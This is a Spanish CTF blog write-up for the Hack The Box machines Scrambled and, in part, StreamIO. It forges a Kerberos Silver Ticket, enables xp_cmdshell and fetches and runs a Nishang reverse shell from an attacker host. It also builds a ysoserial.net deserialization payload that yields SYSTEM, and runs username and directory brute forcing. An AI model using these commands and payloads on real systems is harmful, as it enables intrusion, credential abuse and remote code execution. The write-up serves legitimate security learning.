S-1-5-21-2743207045-1827831105-2542523200-501 S-1-5-21-2743207045-1827831105-2542523200-1000 krbtgt S-1-5-21-2743207045-1827831105-2542523200-502 tstar S-1-5-21-2743207045-1827831105-2542523200-1106 asmith S-1-5-21-2743207045-1827831105-2542523200-1107 sjenkins S-1-5-21-2743207045-1827831105-2542523200-1118 sdonington S-1-5-21-2743207045-1827831105-2542523200-1119 S-1-5-21-2743207045-1827831105-2542523200-1120 backupsvc S-1-5-21-2743207045-1827831105-2542523200-1601 jhall S-1-5-21-2743207045-1827831105-2542523200-1603 rsmith S-1-5-21-2743207045-1827831105-2542523200-1604 ehooker S-1-5-21-2743207045-1827831105-2542523200-1605 khicks S-1-5-21-2743207045-1827831105-2542523200-1611 sqlsvc S-1-5-21-2743207045-1827831105-2542523200-1613 miscsvc S-1-5-21-2743207045-1827831105-2542523200-1617 ksimpson S-1-5-21-2743207045-1827831105-2542523200-1619 π ~/htb/scrambled ❯ SIDKerberos.py Necesitamos un hash NTLM del usuario, en este caso tenemos la contraseña en texto plano de sqlsvc, con python podemos generar el hash NTLM.\n1 2 3 π ~/htb/scrambled ❯ python -c \u0026#39;import hashlib,binascii; print(binascii.hexlify(hashlib.new(\u0026#34;md4\u0026#34;, \u0026#34;Pegasus60\u0026#34;.encode(\u0026#34;utf-16le\u0026#34;)).digest()))\u0026#39; b\u0026#39;b999a16500b87d17ec7f2e2a68778f05\u0026#39; π ~/htb/scrambled ❯ Con ello tenemos la información necesaria para generar nuestro ticket, utilizando ticketer de impacket generamos el ticket. Observamos que el ticket se guardó en sqlsvc.ccache.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 π ~/htb/scrambled ❯ impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip 10.10.11.168 -spn cifs/dc1.scrm.local sqlsvc Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Creating basic skeleton ticket and PAC Infos [*] Customizing ticket for scrm.local/sqlsvc [*] PAC_LOGON_INFO [*] PAC_CLIENT_INFO_TYPE [*] EncTicketPart [*] EncTGSRepPart [*] Signing/Encrypting final ticket [*] PAC_SERVER_CHECKSUM [*] PAC_PRIVSVR_CHECKSUM [*] EncTicketPart [*] EncTGSRepPart [*] Saving ticket in sqlsvc.ccache π ~/htb/scrambled ❯ Ref. (1, 2, 3, 4, 5) MSSQL Exportamos el path completo del ticket en la variable KRB5CCNAME, ejecutamos mssqlclient de impacket con autenticación kerberos, logramos obtener acceso.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 π ~/htb/scrambled ❯ impacket-mssqlclient scrm.local/sqlsvc@dc1.scrm.local -no-pass -k Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(DC1): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(DC1): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands SQL\u0026gt; select USER; -------------------------------------------------------------------------------------------------------------------------------- dbo SQL\u0026gt; Enumeramos las bases de datos observamos ScrambleHR, observamos en la tabla UserImport las credenciales de ldap para el usuario miscsvc.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 SQL\u0026gt; select name from sys.databases; name -------------------------------------------------------------------------------------------------------------------------------- master tempdb model msdb ScrambleHR SQL\u0026gt; use ScrambleHR; [*] ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR [*] INFO(DC1): Line 1: Changed database context to \u0026#39;ScrambleHR\u0026#39;. SQL\u0026gt; SELECT table_name FROM information_schema.tables; table_name -------------------------------------------------------------------------------------------------------------------------------- Employees UserImport Timesheets SQL\u0026gt; select * from UserImport; LdapUser LdapPwd LdapDomain RefreshInterval IncludeGroups -------------------------------------------------- -------------------------------------------------- -------------------------------------------------- --------------- ------------- MiscSvc ScrambledEggs9900 scrm.local 90 0 SQL\u0026gt; Shell Al igual que Querier - HTB activamos xp_cmdshell para la ejecución de comandos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 SQL\u0026gt; EXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1; EXEC sp_configure reconfigure; EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;EXEC sp_configure reconfigure; [*] INFO(DC1): Line 185: Configuration option \u0026#39;show advanced options\u0026#39; changed from 0 to 1. Run the RECONFIGURE statement to install. [*] INFO(DC1): Line 185: Configuration option \u0026#39;xp_cmdshell\u0026#39; changed from 0 to 1. Run the RECONFIGURE statement to install. name minimum maximum config_value run_value ----------------------------------- ----------- ----------- ------------ ----------- allow polybase export 0 1 0 0 [.. snip ..] user options 0 32767 0 0 xp_cmdshell 0 1 1 0 SQL\u0026gt; Observamos que tenemos acceso como sqlsvc.\n1 2 3 4 5 6 7 8 9 10 SQL\u0026gt; EXEC master.dbo.xp_cmdshell \u0026#39;whoami\u0026#39;; output --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- scrm\\sqlsvc NULL SQL\u0026gt; Ejecutamos una shell de Nishang de powershell.\n1 EXEC master.dbo.xp_cmdshell \u0026#34;powershell.exe -c iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.207/shell.ps1\u0026#39;)\u0026#34;; Tras ello logramos obtener acceso como sqlsvc.\n1 2 3 4 5 6 7 8 9 π ~/htb/scrambled ❯ rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.207] from scramblecorp.com [10.10.11.168] 57575 Windows PowerShell running as user sqlsvc on DC1 Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u0026gt; whoami scrm\\sqlsvc PS C:\\Windows\\system32\u0026gt; User - Miscsvc En la raiz del disco encontramos la carpeta Shares, unicamente tenemos acceso a Public/ donde encontramos un PDF con información sobre un ataque reciente y la desactivación de autenticación por NTLM.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 PS C:\\Shares\u0026gt; dir Directory: C:\\Shares Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 01/11/2021 15:21 HR d----- 03/11/2021 19:32 IT d----- 01/11/2021 15:21 Production d----- 04/11/2021 22:23 Public d----- 03/11/2021 19:33 Sales PS C:\\Shares\u0026gt; Shell Similar a Arkham - HTB, utilizamos las credenciales que encontramos en la base de datos para ejecutar comandos como miscsvc. Observamos que tenemos acceso como miscsvc.\n1 2 3 4 5 6 7 PS C:\\users\u0026gt; $SecPassword = ConvertTo-SecureString \u0026#39;ScrambledEggs9900\u0026#39; -AsPlainText -Force; PS C:\\users\u0026gt; $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;MiscSvc\u0026#39;, $SecPassword); PS C:\\users\u0026gt; $session = New-PSSession -ComputerName DC1.SCRM.LOCAL -Credential $Cred; PS C:\\users\u0026gt; Invoke-Command -Session $session -ScriptBlock { whoami } scrm\\miscsvc PS C:\\users\u0026gt; PS C:\\users\u0026gt; Ejecutamos una shell de nishang.\n1 Invoke-Command -Session $session -ScriptBlock { powershell.exe -c \u0026#34;iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.207/shell2.ps1\u0026#39;)\u0026#34; } Logrando obtener nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 π ~/htb/scrambled ❯ rlwrap nc -lvp 1336 listening on [any] 1336 ... connect to [10.10.14.207] from scramblecorp.com [10.10.11.168] 57607 Windows PowerShell running as user miscsvc on DC1 Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\Users\\miscsvc\\Documents\u0026gt; whoami scrm\\miscsvc PS C:\\Users\\miscsvc\\Documents\u0026gt; cd ../Desktop PS C:\\Users\\miscsvc\\Desktop\u0026gt; dir Directory: C:\\Users\\miscsvc\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 15/07/2022 05:56 34 user.txt PS C:\\Users\\miscsvc\\Desktop\u0026gt; cat user.txt 53310aeb2461d48034d2169608926e2c PS C:\\Users\\miscsvc\\Desktop\u0026gt; Privesc Descubrimos una aplicación de escritorio en una de las carpetas de C:\\Shares, seguramente es de la que se habla en el sitio web.\n1 2 3 4 5 6 7 8 9 10 11 12 13 PS C:\\Shares\\IT\\Apps\\Sales Order Client\u0026gt; dir Directory: C:\\Shares\\IT\\Apps\\Sales Order Client Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 05/11/2021 20:52 86528 ScrambleClient.exe -a---- 05/11/2021 20:52 19456 ScrambleLib.dll PS C:\\Shares\\IT\\Apps\\Sales Order Client\u0026gt; Tras obtener ambos archivos vemos que podrían estar escrito en .NET.\n1 2 3 4 5 π ~/htb/scrambled/app ❯ file ScrambleClient.exe ScrambleClient.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows π ~/htb/scrambled/app ❯ file ScrambleLib.dll ScrambleLib.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows π ~/htb/scrambled/app ❯ ScrambleClient Instalamos ILSpy en una máquina windows para obtener el codigo fuente para analizarlo.\nAbrimos el archivo ScrambleClient.exe observamos los diferentes componentes de este, no muestran algun tipo de interacción con el servidor o algun servicio, unicamente botones, labels inputs, etc., además hace uso de la libreria ScrambleLib.\nScrambleLib Observamos las diferentes clases que la librería ofrece, una de ellas es Log.\nEn esta se muestra que realiza la escritura en el archivo ScrambleDebugLog.txt.\nEn SalesOrder encontramos funciones para Serializar y Deserializar en BinaryFormat en base64, lo que supondría una vulnerabilidad.\nEn ScrambleNetClient encontramos que es posible saltarse el login utilizando el usuario \u0026lsquo;scrmdev\u0026rsquo;.\nAdemás de algunas funciones que permiten enviar y/o recibir datos.\nScrambledNetRequest y ScrambledNetResponse manejan las diferentes solicitudes. Finalmente ScrambleNetShared contiene constantes.\nScramble - App Configuramos la dirección del servidor a la dirección IP de la máquina.\nUtilizando como usario \u0026lsquo;scrmdev\u0026rsquo; logramos ingresar, observamos una lista de ordenes.\nAdemás podemos enviar una nueva orden.\nEjecutamos Wireshark para ver las solicitudes realizadas por la aplicación, observamos que al enviar una nueva orden realiza una conexión con el servidor en el puerto 4411, enviando la información serializada y codificada seguramente en base64 como se observa en el código.\nAl decodificar observamos información sobre la clase u objeto SalesOrder.\nSi realizamos una conexión con la máquina en el puerto 4411 observamos un error tras enviar información incorrecta, y que espera un string en base64 serializado.\n1 2 3 4 5 6 π ~/htb/scrambled ❯ nc 10.10.11.168 4411 SCRAMBLECORP_ORDERS_V1.0.3; UPLOAD_ORDER;abc ERROR_GENERAL;Error deserializing sales order: Invalid length for a Base-64 char array or string. QUIT π ~/htb/scrambled ❯ Ysoserial.NET YSoSerial es una herramienta que contiene una libreria de gadgets que permiten explotar vulnerabilidades de deserialization en aplicaciones .NET. Observamos que tiene varios gadgets aunque no sabemos cual de ellos podría funcionar en la aplicación por lo que generamos un \u0026lsquo;payload\u0026rsquo; con cada uno de ellos realizando un ping a nuestra máquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 [.. snip ..] == GADGETS == (*) [Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored] Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter (*) [This gadget ignores the command parameter and executes the constructor of ExploitClass class] (supports extra options: use the \u0026#39;--fullhelp\u0026#39; argument to view) Formatters: BinaryFormatter (2) , LosFormatter , SoapFormatter (*) [Another variant of the ActivitySurrogateSelector gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., \u0026#39;-c ExploitClass.cs;System.Windows.Forms.dll\u0026#39;] (supports extra options: use the \u0026#39;--fullhelp\u0026#39; argument to view) Formatters: BinaryFormatter (2) , LosFormatter , SoapFormatter (*) Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter (*) Formatters: BinaryFormatter , LosFormatter , SoapFormatter (*) Formatters: BinaryFormatter , LosFormatter , SoapFormatter (*) (supports extra options: use the \u0026#39;--fullhelp\u0026#39; argument to view) Formatters: DataContractSerializer (2) , FastJson , FsPickler , JavaScriptSerializer , Json.Net , SharpSerializerBinary , SharpSerializerXml , Xaml (4) , XmlSerializer (2) , YamlDotNet \u0026lt; 5.0.0 (*) [Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017)] Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer , SoapFormatter (*) Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter (*) Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter (*) Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter (*) [This normally generates the shortest payload] (supports extra options: use the \u0026#39;--fullhelp\u0026#39; argument to view) Formatters: BinaryFormatter , DataContractSerializer , LosFormatter , NetDataContractSerializer , SoapFormatter (*) Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer (*) [Tweaked TypeConfuseDelegate gadget to work with Mono] Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer (*) [Requires Microsoft.IdentityModel.Claims namespace (not default GAC)] (supports extra options: use the \u0026#39;--fullhelp\u0026#39; argument to view) Formatters: BinaryFormatter (3) , DataContractSerializer (2) , Json.Net (2) , LosFormatter (3) , NetDataContractSerializer (3) , SoapFormatter (2) (*) Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter (*) Formatters: BinaryFormatter , DataContractJsonSerializer , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter Ping Test Utilizamos la siguiente \u0026ldquo;sintaxis\u0026rdquo; para el envio del payload realizando una conexión por netcat, tal y como se observa en Wireshark.\n1 UPLOAD_ORDER;\u0026lt;payload\u0026gt; Tras intentar con diferentes gadgets obtuvimos pings desde la máquina con siete de ellos (pestaña 2).\nbash\rGadgets\r1 2 3 4 5 6 7 8 9 10 11 π ~/htb/scrambled ❯ sudo tcpdump -i tun1 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun1, link-type RAW (Raw IP), snapshot length 262144 bytes 00:40:15.170285 IP dc1.scrm.local \u0026gt; 10.10.14.207: ICMP echo request, id 1, seq 1, length 40 00:40:15.170355 IP 10.10.14.207 \u0026gt; dc1.scrm.local: ICMP echo reply, id 1, seq 1, length 40 00:40:16.180870 IP dc1.scrm.local \u0026gt; 10.10.14.207: ICMP echo request, id 1, seq 2, length 40 00:40:16.180886 IP 10.10.14.207 \u0026gt; dc1.scrm.local: ICMP echo reply, id 1, seq 2, length 40 00:40:17.198144 IP dc1.scrm.local \u0026gt; 10.10.14.207: ICMP echo request, id 1, seq 3, length 40 00:40:17.198158 IP 10.10.14.207 \u0026gt; dc1.scrm.local: ICMP echo reply, id 1, seq 3, length 40 00:40:18.210003 IP dc1.scrm.local \u0026gt; 10.10.14.207: ICMP echo request, id 1, seq 4, length 40 00:40:18.210043 IP 10.10.14.207 \u0026gt; dc1.scrm.local: ICMP echo reply, id 1, seq 4, length 40 1 2 3 4 5 6 7 8 9 AxHostState ClaimsIdentity DataSet RolePrincipal SessionSecurityToken SessionViewStateHistoryItem TextFormattingRunProperties TypeConfuseDelegate WindowsIdentity Shell Con ello generamos un nuevo payload para ejecutar una shell Nishang.\n1 2 3 PS C:\\Users\\skuld\\Downloads\\ysoserial-1.34\\Release\u0026gt; ./ysoserial.exe -f BinaryFormatter -g AxHostState -o base64 -c \u0026#34;powershell.exe -c iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.207/shell.ps1\u0026#39;)\u0026#34; AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAOsDAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAjQY8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/Pg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI+DQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQogICAgPHNkOlByb2Nlc3M+DQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgcG93ZXJzaGVsbC5leGUgLWMgaWV4KG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHA6Ly8xMC4xMC4xNC4yMDcvc2hlbGwucHMxJykiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cws= PS C:\\Users\\skuld\\Downloads\\ysoserial-1.34\\Release\u0026gt; Tras enviar el payload obtuvimos una shell como administrador y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 π ~/htb/scrambled ❯ rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.207] from scramblecorp.com [10.10.11.168] 58472 Windows PowerShell running as user DC1$ on DC1 Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u0026gt; whoami nt authority\\system PS C:\\Windows\\system32\u0026gt; cd C:\\users\\administrator\\desktop PS C:\\users\\administrator\\desktop\u0026gt; dir Directory: C:\\users\\administrator\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 15/07/2022 05:56 34 root.txt PS C:\\users\\administrator\\desktop\u0026gt; cat root.txt d4e301b8c323e25911c44ce30bcbe5b8 PS C:\\users\\administrator\\desktop\u0026gt; ","description":"Scrambled presenta información en su sitio web que nos permitió identificar unas credenciales las cuales nos ayudaron a generar un 'Silver Ticket' para posteriormente acceder por MSSQL. Con las credenciales dentro de una base de datos y PowerShell accedimos a un segundo usuario. Finalmente escalamos privilegios tras descubrir y analizar una aplicación de escritorio en la que explotamos una vulnerabilidad de 'Deserialization' en .NET con la ayuda de Ysoserial.NET.","id":16,"section":"posts","tags":["kerbrute","kerberos","impacket","WADComs","GetUserSPNs","Silver Ticket","mssqlclient","nishang","invoke-command","new-PSSession","powershell",".net","ILSpy","ysoserial.net"],"title":"Hack The Box - Scrambled","uri":"https://sckull.github.io/posts/scramble/"},{"content":"\rEn StreamIO descubrimos y explotamos una vulnerabilidad SQLi la cual nos permitió acceder a un panel de administración, en este ultimo encontramos una vulnerabilidad LFI, en consecuencia RFI y Code Injection lo que nos dió acceso a un primer usuario. Tras enumerar las bases de datos obtuvimos credenciales para un segundo usuario. Credenciales en un perfil de Firefox nos permitió ingresar con un tercer usuario. Finalmente con los permisos de este último realizamos la lectura de la contraseña en LAPS para acceder como administrador.\nNombre StreamIO OS Windows Puntos 30 Dificultad Media IP 10.10.11.158 Maker JDgodd nikk37 Matrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.8, 6.7, 5.6, 4.4, 3.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: dns (53), http/s (80, 445), kerberos (88), rpc (135), ldap (389,3268) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 # Nmap 7.92 scan initiated Tue Jun 21 19:28:43 2022 as: nmap -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,49667,49673,60885 -sV -sC -oN nmap_scan 10.10.11.158 Nmap scan report for 10.10.11.158 (10.10.11.158) Host is up (0.079s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: IIS Windows Server | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-06-22 06:28:44Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name) 443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 | tls-alpn: |_ http/1.1 |_ssl-date: 2022-06-22T06:30:14+00:00; +6h59m53s from scanner time. | ssl-cert: Subject: commonName=streamIO/countryName=EU | Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb | Not valid before: 2022-02-22T07:03:28 |_Not valid after: 2022-03-24T07:03:28 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 60885/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 6h59m53s, deviation: 0s, median: 6h59m52s | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required | smb2-time: | date: 2022-06-22T06:29:35 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jun 21 19:30:21 2022 -- 1 IP address (1 host up) scanned in 97.67 seconds Kerbrute La máquina presenta el puerto de kerberos abierto, utilizamos kerbrute para enumerar usuarios, observamos unicamente: administrator y martin.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 π ~/htb/streamio ❯ ./kerbrute userenum --dc streamio.htb -d streamio.htb -t 100 xato-net-10-million-usernames-dup.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 07/04/22 - Ronnie Flathers @ropnop 2022/07/04 20:42:37 \u0026gt; Using KDC(s): 2022/07/04 20:42:37 \u0026gt; streamio.htb:88 2022/07/04 20:42:37 \u0026gt; [+] VALID USERNAME: martin@streamio.htb 2022/07/04 20:42:38 \u0026gt; [+] VALID USERNAME: Martin@streamio.htb 2022/07/04 20:42:41 \u0026gt; [+] VALID USERNAME: administrator@streamio.htb 2022/07/04 20:43:00 \u0026gt; [+] VALID USERNAME: MARTIN@streamio.htb 2022/07/04 20:43:15 \u0026gt; [+] VALID USERNAME: Administrator@streamio.htb 2022/07/04 21:10:24 \u0026gt; Done! Tested 624370 usernames (5 valid) in 1667.117 seconds π ~/htb/streamio ❯ Web Site El sitio web no presenta alguna redirección o dominio, aunque vemos un Microsoft IIS 10 como servidor.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/streamio ❯ curl -sI 10.10.11.158 HTTP/1.1 200 OK Content-Length: 703 Content-Type: text/html Last-Modified: Tue, 22 Feb 2022 10:46:01 GMT Accept-Ranges: bytes ETag: \u0026#34;b23de861d927d81:0\u0026#34; Server: Microsoft-IIS/10.0 X-Powered-By: ASP.NET Date: Tue, 05 Jul 2022 07:54:57 GMT π ~/htb/streamio ❯ Unicamente se muestra el index de IIS.\nStreamio.htb nmap en el puerto 445 (https) muestra un dominio y subdominio (streamio.htb, watch.streamio.htb), tras agregarlos en /etc/hosts observamos que el dominio presenta información sobre streaming de peliculas.\nEn /about.php se muestran tres nombres los cuales podríamos utilizar como nombres de usuarios.\nDirectory Brute Forcing feroxbuster muestra páginas nuevas como el login y registro.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 π ~/htb/streamio ❯ feroxbuster -k -u https://streamio.htb/ -w $MD --depth 1 -x asp,aspx,html,php ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.5.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ https://streamio.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.5.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [asp, aspx, html, php] 🏁 HTTP methods │ [GET] 🔓 Insecure │ true 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 301 GET 2l 10w 151c https://streamio.htb/images =\u0026gt; https://streamio.htb/images/ 200 GET 231l 571w 7825c https://streamio.htb/about.php 200 GET 395l 915w 13497c https://streamio.htb/index.php 200 GET 111l 269w 4145c https://streamio.htb/login.php 200 GET 121l 291w 4500c https://streamio.htb/register.php 200 GET 206l 430w 6434c https://streamio.htb/contact.php 301 GET 2l 10w 151c https://streamio.htb/Images =\u0026gt; https://streamio.htb/Images/ 301 GET 2l 10w 150c https://streamio.htb/admin =\u0026gt; https://streamio.htb/admin/ 301 GET 2l 10w 148c https://streamio.htb/css =\u0026gt; https://streamio.htb/css/ 200 GET 206l 430w 6434c https://streamio.htb/Contact.php 200 GET 231l 571w 7825c 